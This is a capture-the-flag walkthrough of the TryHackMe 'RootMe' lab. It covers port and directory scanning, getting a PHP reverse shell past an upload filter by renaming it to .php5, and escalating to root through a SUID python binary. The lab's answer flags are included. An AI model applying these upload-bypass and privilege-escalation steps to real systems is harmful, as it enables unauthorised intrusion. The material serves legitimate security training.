## ROOTME
#### A Tryhackme Exercise
___

#### Description
Gain root access to host 10.10.182.132 and answer following questions

##### **Reconnaissance**
+ How many ports are open?

      Answer: 2

+ What version of Apache is running?

      Answer: 2.4.29
+ What service is running on port 22?

      Answer: ssh
+ Find directories on the web server using the Gobuster tool.


+ What is the hidden directory?

      Answer: /panel/
___

Process

The first step in solving this problem was to do a port scan of the target. Because some of the questions ask for services and versions, I've done an aggressive scan which will return additional information.

    nmap -A 10.10.182.132
   Result:

    
    Not shown: 998 closed ports
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; 
    protocol 2.0)
    | ssh-hostkey: 
    |   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
    |   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
    |_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (EdDSA)
    80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
    | http-cookie-flags: 
    |   /: 
    |     PHPSESSID: 
    |_      httponly flag not set
    |_http-server-header: Apache/2.4.29 (Ubuntu)
    |_http-title: HackIT - Home

Here we note 998 closed ports and 2 open ports: 
+ 22 tcp open ssh
+ 80 tcp open http

This helps us answer some of the above questions. We note there are **2 open ports** The version of Apache that is running is **2.4.29** and we note that the service that is running on port 22 is **ssh**

To find the hidden directory I first used the **gobuster** tool to return a list of directories from this host

      root@ip-10-10-121-131:~# gobuster dir --url http://10.10.182.132/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Result: 

      /uploads (Status: 301)
      /css (Status: 301)
      /js (Status: 301)
      /panel (Status: 301)
      /server-status (Status: 403)

using gobuster command we get a result of 5 different directories. Next step is to take a look at the front end of the address and check each one of these directories. 

<front end page image here>

This is a pretty honest write-up. There is nothing that I can find that determines which of the directories are hidden- but by trial of elimination we know that /panel is our hidden directory. This directory has a file upload feature. 

<image of panel section goes here> 

___
##### **Getting A Shell**

+ Find a form to upload and get a reverse shell, and find the flag in user.txt

      Answer: THM{y0u_g0t_a_sh3ll}

Process

To get shell access the only possible vulnerability I can find is the panel directory that allows you to upload files. If we can upload a file with malicious code it can potentially give us shell access. To do this We look into the Reverse Shell Cheat Sheet offered by pentestmonkey.net

Out of the many options listed, we note that PHP offers an option to upload a php reverse shell file to gain shell access via http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz

According to the documentation, we need to edit the file to adjust the directed IP and the port number we will use. Additionally we want to make sure to use netcat to listen on this port number. 

      $ip = '127.0.0.1';  // CHANGE THIS
      $port = 1234;       // CHANGE THIS

At first, there was some trouble uploading to the site as the site did not accept .php files. However reading the documentation, it states that a different version of PHP such as PHP5 should be used when working with web servers, so we **change our file name extension to .php5**

We listen to port, in this case I am using port 9999

     nc -lnvp 9999
And upload the .php5 file. Once the file has been uploaded we can visit the uploads directory and run the program to see if we gain shell access. 

<add uploads image here>

This gives us shell access!

To answer the assignment question, we search for the file "user.txt" using the following command: 

     $ find / -type f -name user.txt 2>/dev/null
     /var/www/user.txt

     $ cat /var/www/user.txt
     THM{y0u_g0t_a_sh3ll}

Using the Cat command we note the message inside of the user.txt file.

___
##### **Privilege Escalation**

+ Search for files with SUID permission, which file is weird? 
      
      Answer: /usr/bin/python

+ Find a form to escalate your privileges.
      


+ Message inside of root.txt
      
      Answer: THM{pr1v1l3g3_3sc4l4t10n}

To find files with (set user ID permissions) I searched for files with user root permissions and see what that command returns: 
      
     find / -user root -perm /4000 2>/dev/null

+ this search command finds files owned by the root user
+ 4000 - finds files specifically with the SUID permission set
+  2>/dev/null - redirects error messages

This returns multiple files. The first question "which file is weird" is quite tough to answer as I am not sure what there is to look for. By process of elimination, I find that the correct answer here is /usr/bin/python

To find a form to escalate privileges and take a look at the root.txt file, we were given a hint to search for GTFobins. 

gtfobins is a list of unix binaries that can be used to bypass security restrictions, documentation and collection of commands can be found: https://gtfobins.github.io/


      python -c 'import pty;pty.spawn ("/bin/bash")'
      python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
      # whoami
      whoami
      root

Once we have root, we search for the root.txt file in question, and use CAT to peek inside. 

      find / -type f -name root.txt 2>/dev/null
      /root/root.txt
      # cat /root/root.txt
      cat /root/root.txt
      THM{pr1v1l3g3_3sc4l4t10n}











 





















